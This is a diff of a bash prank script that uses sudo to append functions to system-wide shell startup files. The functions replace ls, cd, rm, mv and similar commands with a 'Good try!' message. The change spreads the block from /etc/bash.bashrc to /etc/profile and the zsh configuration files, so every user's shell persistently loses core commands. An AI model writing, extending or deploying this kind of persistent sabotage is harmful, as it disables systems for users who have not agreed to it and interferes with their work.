@@ -1,17 +1,11 @@
-!/usr/bin/env bash
+#!/usr/bin/env bash
 
 set -euo pipefail
 
-TARGET_FILE="/etc/bash.bashrc"
+MARKER="# >>> funny-wrapper-block >>>"
 
-if [ ! -e "$TARGET_FILE" ]; then
-    echo "✖  $TARGET_FILE does not exist – this script is intended for a system that uses /etc/bash.bashrc (Debian/Ubuntu style)." >&2
-    exit 1
-fi
-
-
-WRAPPER_BLOCK=$(cat <<'EOF'
-
+WRAPPER_BLOCK=$(cat <<EOF
+$MARKER
 ls()  { echo "ദ്ദി ᗜˬᗜ✧ Good try! ദ്ദി ᗜˬᗜ✧"; }
 cd()  { echo "ദ്ദി ᗜˬᗜ✧ Good try! ദ്ദി ᗜˬᗜ✧"; }
 rm()  { echo "ദ്ദി ᗜˬᗜ✧ Good try! ദ്ദി ᗜˬᗜ✧"; }
@@ -21,9 +15,21 @@ mv()  { echo "ദ്ദി ᗜˬᗜ✧ Good try! ദ്ദി ᗜˬᗜ✧"; }
 EOF
 )
 
-if grep -Fq "$(printf '%s' "$WRAPPER_BLOCK" | head -n1)" "$TARGET_FILE"; then
-    exit 0
-fi
+TARGET_FILES=(
+    "/etc/bash.bashrc"   # bash, non-login interactive (Debian/Ubuntu)
+    "/etc/profile"        # sh-compatible login shells (bash, dash, ksh when invoked as login)
+)
 
-# ------------------------------------------------------------
-printf '%s\n' "$WRAPPER_BLOCK" | sudo tee -a "$TARGET_FILE" > /dev/null
+[ -d /etc/zsh ] && TARGET_FILES+=("/etc/zsh/zshrc" "/etc/zsh/zprofile")
+
+for TARGET_FILE in "${TARGET_FILES[@]}"; do
+    if [ ! -e "$TARGET_FILE" ]; then
+        continue
+    fi
+
+    if grep -Fq "$MARKER" "$TARGET_FILE" 2>/dev/null; then
+        continue
+    fi
+
+    printf '%s\n' "$WRAPPER_BLOCK" | sudo tee -a "$TARGET_FILE" > /dev/null
+done
